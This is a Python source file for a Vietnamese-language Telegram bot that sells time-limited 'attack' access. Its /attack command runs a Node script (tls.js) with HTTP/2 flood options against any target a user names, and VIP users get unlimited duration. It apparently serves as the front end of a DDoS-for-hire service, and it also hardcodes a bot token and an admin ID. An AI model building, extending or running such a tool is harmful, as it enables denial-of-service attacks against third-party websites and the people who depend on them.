# File: bot.py
import telegram
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
import asyncio
import subprocess
import json
import logging

# Cấu hình logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Token bot Telegram của bạn
BOT_TOKEN = '8404591037:AAFn-zck0anDPjaR2mcSY8fulg5-Iphdq6A'

# ID Admin (7105201572)
ADMIN_ID = 7105201572

# File lưu danh sách VIP
VIP_FILE = 'vip_users.json'

# Load danh sách VIP từ file
def load_vip_users():
    try:
        with open(VIP_FILE, 'r') as f:
            return set(json.load(f))
    except FileNotFoundError:
        return set()

# Lưu danh sách VIP
def save_vip_users(vip_users):
    with open(VIP_FILE, 'w') as f:
        json.dump(list(vip_users), f)

# Danh sách VIP
vip_users = load_vip_users()

# Hàm kiểm tra quyền Admin
def is_admin(user_id):
    return user_id == ADMIN_ID

# Hàm kiểm tra VIP
def is_vip(user_id):
    return user_id in vip_users

async def start(update, context):
    """Lệnh /start"""
    user = update.effective_user
    await update.message.reply_text(
        f'👋 Chào {user.first_name}!\n\n'
        '🤖 Bot Attack Commands:\n'
        '• /attack <target> <time> - Gửi request\n'
        '• /checkvip - Kiểm tra VIP\n'
        '• /vipinfo - Thông tin VIP\n\n'
        '👑 Admin Commands:\n'
        '• /addvip <user_id> - Thêm VIP\n'
        '• /removevip <user_id> - Xóa VIP\n'
        '• /listvip - Danh sách VIP'
    )

async def attack(update, context):
    """Lệnh /attack target time"""
    user_id = update.effective_user.id
    args = context.args
    
    # Kiểm tra số lượng tham số
    if len(args) < 2:
        await update.message.reply_text(
            '❌ Sai cú pháp!\n'
            '✅ Sử dụng: /attack <target> <time>\n'
            '📝 Ví dụ: /attack example.com 60'
        )
        return
    
    target = args[0]
    time_str = args[1]
    
    # Kiểm tra thời gian cho non-VIP
    if not is_vip(user_id):
        try:
            time_int = int(time_str)
            if time_int > 120:
                await update.message.reply_text(
                    f'❌ Bạn không phải VIP!\n'
                    f'⏰ Thời gian tối đa: 120 giây\n'
                    f'💎 Liên hệ Admin để nâng cấp VIP'
                )
                return
        except ValueError:
            await update.message.reply_text('❌ Thời gian phải là số!')
            return
    
    try:
        # Thông báo bắt đầu
        status_msg = await update.message.reply_text(
            f'🚀 Đang khởi động attack...\n'
            f'🎯 Target: {target}\n'
            f'⏰ Time: {time_str}s\n'
            f'👤 User: {update.effective_user.first_name}\n'
            f'💎 VIP: {"Có" if is_vip(user_id) else "Không"}'
        )
        
        # Chuẩn bị command
        cmd = [
            'node', 'tls.js',
            target, time_str, '4', '5', 'y.txt',
            '--http', '2',
            '--winter',
            '--full'
        ]
        
        # Chạy file tls.js
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        # Cập nhật trạng thái
        await status_msg.edit_text(
            f'⚡ Đang chạy attack...\n'
            f'🎯 {target}\n'
            f'⏰ {time_str}s\n'
            f'⏳ Vui lòng chờ...'
        )
        
        # Chờ process hoàn thành với timeout
        try:
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)
        except asyncio.TimeoutError:
            await status_msg.edit_text('❌ Attack timeout! Process quá lâu.')
            process.kill()
            return
        
        # Gửi kết quả
        if process.returncode == 0:
            result = stdout.decode() if stdout else "✅ Attack completed!"
            # Giới hạn độ dài tin nhắn
            result_preview = result[:1000] + "..." if len(result) > 1000 else result
            await status_msg.edit_text(
                f'✅ Attack hoàn thành!\n'
                f'🎯 {target}\n'
                f'⏰ {time_str}s\n'
                f'📊 Kết quả:\n```{result_preview}```'
            )
        else:
            error = stderr.decode() if stderr else "❌ Unknown error occurred"
            error_preview = error[:1000] + "..." if len(error) > 1000 else error
            await status_msg.edit_text(
                f'❌ Lỗi khi attack!\n'
                f'🎯 {target}\n'
                f'⏰ {time_str}s\n'
                f'📋 Lỗi:\n```{error_preview}```'
            )
            
    except Exception as e:
        await update.message.reply_text(f'❌ Lỗi hệ thống: {str(e)}')

async def addvip(update, context):
    """Lệnh /addvip user_id - Chỉ Admin"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text('❌ Chỉ Admin mới có quyền này!')
        return
    
    if not context.args:
        await update.message.reply_text('❌ Thiếu user_id! Sử dụng: /addvip <user_id>')
        return
    
    try:
        vip_id = int(context.args[0])
        vip_users.add(vip_id)
        save_vip_users(vip_users)
        await update.message.reply_text(f'✅ Đã thêm user {vip_id} vào VIP!')
    except ValueError:
        await update.message.reply_text('❌ user_id phải là số!')

async def removevip(update, context):
    """Lệnh /removevip user_id - Chỉ Admin"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text('❌ Chỉ Admin mới có quyền này!')
        return
    
    if not context.args:
        await update.message.reply_text('❌ Thiếu user_id! Sử dụng: /removevip <user_id>')
        return
    
    try:
        vip_id = int(context.args[0])
        if vip_id in vip_users:
            vip_users.remove(vip_id)
            save_vip_users(vip_users)
            await update.message.reply_text(f'✅ Đã xóa user {vip_id} khỏi VIP!')
        else:
            await update.message.reply_text(f'❌ User {vip_id} không có trong VIP!')
    except ValueError:
        await update.message.reply_text('❌ user_id phải là số!')

async def checkvip(update, context):
    """Lệnh /checkvip - Kiểm tra trạng thái VIP"""
    user_id = update.effective_user.id
    
    if is_vip(user_id):
        await update.message.reply_text(
            f'👑 Bạn là VIP!\n'
            f'✅ Thời gian attack: KHÔNG GIỚI HẠN\n'
            f'🎯 Ưu tiên cao nhất'
        )
    else:
        await update.message.reply_text(
            f'ℹ️ Bạn không phải VIP\n'
            f'⏰ Thời gian tối đa: 120 giây\n'
            f'💎 Liên hệ Admin để nâng cấp'
        )

async def vipinfo(update, context):
    """Lệnh /vipinfo - Thông tin VIP"""
    vip_count = len(vip_users)
    
    await update.message.reply_text(
        f'💎 **THÔNG TIN HỆ THỐNG VIP** 💎\n\n'
        f'👑 **VIP Users:**\n'
        f'• Thời gian: KHÔNG GIỚI HẠN\n'
        f'• Ưu tiên: CAO NHẤT\n'
        f'• Số lượng: {vip_count} users\n\n'
        f'👤 **Normal Users:**\n'
        f'• Thời gian: Tối đa 120s\n'
        f'• Ưu tiên: Bình thường\n\n'
        f'📋 **Lệnh:**\n'
        f'/checkvip - Kiểm tra VIP\n'
        f'/vipinfo - Thông tin này'
    )

async def listvip(update, context):
    """Lệnh /listvip - Danh sách VIP (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text('❌ Chỉ Admin mới có quyền này!')
        return
    
    if not vip_users:
        await update.message.reply_text('📝 Danh sách VIP trống!')
        return
    
    vip_list = '\n'.join([f'• {user_id}' for user_id in vip_users])
    await update.message.reply_text(
        f'👑 **DANH SÁCH VIP**\n\n'
        f'{vip_list}\n\n'
        f'Tổng: {len(vip_users)} users'
    )

def main():
    """Khởi chạy bot"""
    # Tạo application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Thêm handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("addvip", addvip))
    application.add_handler(CommandHandler("removevip", removevip))
    application.add_handler(CommandHandler("checkvip", checkvip))
    application.add_handler(CommandHandler("vipinfo", vipinfo))
    application.add_handler(CommandHandler("listvip", listvip))
    
    # Khởi chạy bot
    print("🤖 Bot Telegram đang khởi động...")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"💎 Số VIP users: {len(vip_users)}")
    
    application.run_polling()

if __name__ == '__main__':
    main()
